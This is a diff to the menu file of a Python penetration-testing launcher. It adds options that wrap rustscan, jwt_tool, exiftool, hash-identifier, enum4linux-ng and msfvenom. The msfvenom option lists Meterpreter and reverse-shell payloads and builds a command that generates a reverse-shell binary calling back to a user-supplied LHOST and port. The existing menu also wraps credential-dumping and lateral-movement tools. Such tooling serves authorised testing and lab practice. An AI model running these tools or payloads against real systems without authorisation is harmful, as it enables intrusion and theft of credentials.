@@ -1,5 +1,5 @@
 # menu.py
-from commands import run_GetADUsers, run_GetNPUsers, run_GetNPUsers_file, run_GetUserSPNs, run_addhosts, run_crackmapexec_evil_hash, run_crackmapexec_evil_password, run_crackmapexec_smb_hash, run_crackmapexec_smb_password, run_dirsearch, run_dnsenum, run_enum4linux, run_evilwinrm_hash, run_evilwinrm_password, run_feroxbuster, run_ffuf, run_ffuf_subdomain, run_gobuster_dir, run_gobuster_dns, run_gobuster_vhost, run_kerbrute, run_ldap, run_mssqlclient, run_nmap_full, run_nmap_udp, run_psexec_hash, run_psexec_password, run_rpcclient, run_secretsdump, run_smbclient, run_smbclient_login, run_smbclient_user, run_smbmap, run_smbmap_user, run_snmpwalk_all, run_snmpwalk_extend, run_wfuzz, run_whatweb, run_xfreerdp
+from commands import run_GetADUsers, run_GetNPUsers, run_GetNPUsers_file, run_GetUserSPNs, run_addhosts, run_crackmapexec_evil_hash, run_crackmapexec_evil_password, run_crackmapexec_smb_hash, run_crackmapexec_smb_password, run_dirsearch, run_dnsenum, run_enum4linux, run_evilwinrm_hash, run_evilwinrm_password, run_feroxbuster, run_ffuf, run_ffuf_subdomain, run_gobuster_dir, run_gobuster_dns, run_gobuster_vhost, run_kerbrute, run_ldap, run_mssqlclient, run_nmap_full, run_nmap_udp, run_psexec_hash, run_psexec_password, run_rpcclient, run_secretsdump, run_smbclient, run_smbclient_login, run_smbclient_user, run_smbmap, run_smbmap_user, run_snmpwalk_all, run_snmpwalk_extend, run_wfuzz, run_whatweb, run_xfreerdp, run_rustscan, run_enum4linux_ng, run_jwt_tool, run_exiftool, run_hash_identifier, run_msfvenom, check_all_tools
 from constants import BOLD, GREEN, LCYAN, LPURPLE, RESET, RED
 import commands
 
@@ -8,13 +8,21 @@ def print_menu():
           f"                                                                                \n"
           f" ,---.                       ,--------.             ,--.,--.                    \n"
           f"'   .-'  ,---.  ,---.,--.,--.'--.  .--',---.  ,---. |  ||  |-.  ,---.,--.  ,--. \n"
-          f"`.  `-. | .-. :| .--'|  ||  |   |  |  | .-. || .-. ||  || .-. '| .-. |\  `'  /  \n"
-          f".-'    |\   --.\ `--.'  ''  '   |  |  ' '-' '' '-' '|  || `-' |' '-' '/  /.  \  \n"
+          f"`.  `-. | .-. :| .--'|  ||  |   |  |  | .-. || .-. ||  || .-. '| .-. |\\  `'  /  \n"
+          f".-'    |\\   --.\\ `--.'  ''  '   |  |  ' '-' '' '-' '|  || `-' |' '-' '/  /.  \\  \n"
           f"`-----'  `----' `---' `----'    `--'   `---'  `---' `--' `---'  `---''--'  '--' \n"
           f"                                                                                \n"
           f"{RESET}")
 
 def display_menu():
+
+    print(f"{BOLD}{GREEN}Wordlists:{RESET}")
+    print("1. /usr/share/wordlists/rockyou.txt.gz")
+    print("2. /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
+    print("3. /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
+    print("4. /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt")
+    print("5. /usr/share/wordlists/amass/subdomains-top1mil-20000.txt")
+
     print(f"{BOLD}{GREEN}\nTools :{RESET}")
     print(f"{LCYAN}\nLinux & Windows{RESET}")
     print("1. Run ffuf (subdomain)")
@@ -28,6 +36,11 @@ def display_menu():
     print("9. Run gobuster (vhost)")
     print("10. Run dirsearch")
     print("11. Run feroxbuster")
+    print("12. Run rustscan")
+    print("13. Run jwt_tool (JWT Analysis)")
+    print("14. Run exiftool (File Metadata)")
+    print("15. Run hash-identifier")
+    print("16. Run msfvenom (Payload Generation)")
     print(f"{LPURPLE}\nActive Directory{RESET}")
     print("20. Run smbclient (guest)")
     print("21. Run smbclient (user & password)")
@@ -56,6 +69,9 @@ def display_menu():
     print("44. Run mssqlclient (username, password & database)")
     print("45. Run getUserSPNs (username & password)")
     print("46. Run GetNPUsers (BruteForce Username.txt)")
+    print("47. Run enum4linux-ng (Next Generation)")
+    print(f"{BOLD}{GREEN}\nUtilities:{RESET}")
+    print("98. Check Tools Installation Status")
     print("99. Addhosts")
     print("0. Exit")
 
@@ -143,6 +159,46 @@ def handle_choice(choice):
         print("")
         print(f"{LPURPLE}Executing:{RESET} {command}")
         run_feroxbuster(url, wordlist)
+    elif choice == '12':
+        target = input("Enter the target: ")
+        ports = input("Enter ports (e.g., 1-65535 or 80,443): ")
+        command = f"rustscan -a {target} -p {ports} -- -sC -sV"
+        print("")
+        print(f"{LPURPLE}Executing:{RESET} {command}")
+        run_rustscan(target, ports)
+    elif choice == '13':
+        token = input("Enter JWT token: ")
+        command = f"jwt_tool {token}"
+        print("")
+        print(f"{LPURPLE}Executing:{RESET} {command}")
+        run_jwt_tool(token)
+    elif choice == '14':
+        file_path = input("Enter file path: ")
+        command = f"exiftool {file_path}"
+        print("")
+        print(f"{LPURPLE}Executing:{RESET} {command}")
+        run_exiftool(file_path)
+    elif choice == '15':
+        hash_value = input("Enter hash to identify: ")
+        print("")
+        print(f"{LPURPLE}Executing:{RESET} hash-identifier")
+        run_hash_identifier(hash_value)
+    elif choice == '16':
+        print("\nCommon payload types:")
+        print("  - windows/meterpreter/reverse_tcp")
+        print("  - linux/x86/meterpreter/reverse_tcp")
+        print("  - php/meterpreter/reverse_tcp")
+        print("  - windows/x64/shell_reverse_tcp")
+        payload_type = input("Enter payload type: ")
+        lhost = input("Enter LHOST (your IP): ")
+        lport = input("Enter LPORT (your port): ")
+        output_file = input("Enter output file name: ")
+        print("\nCommon formats: exe, elf, php, raw, war, aspx")
+        format_type = input("Enter format type: ")
+        command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {format_type} -o {output_file}"
+        print("")
+        print(f"{LPURPLE}Executing:{RESET} {command}")
+        run_msfvenom(payload_type, lhost, lport, output_file, format_type)
 
 
     # Active Directory
@@ -352,6 +408,14 @@ def handle_choice(choice):
         print("")
         print(f"{LPURPLE}Executing:{RESET} {command}")
         run_GetNPUsers_file(url, domain, username)
+    elif choice == '47':
+        target = input("Enter the target: ")
+        command = f"enum4linux-ng {target} -A"
+        print("")
+        print(f"{LPURPLE}Executing:{RESET} {command}")
+        run_enum4linux_ng(target)
+    elif choice == '98':
+        check_all_tools()
     elif choice == '99':
         ip = input("Enter the IP: ")
         host = input("Enter host: ")
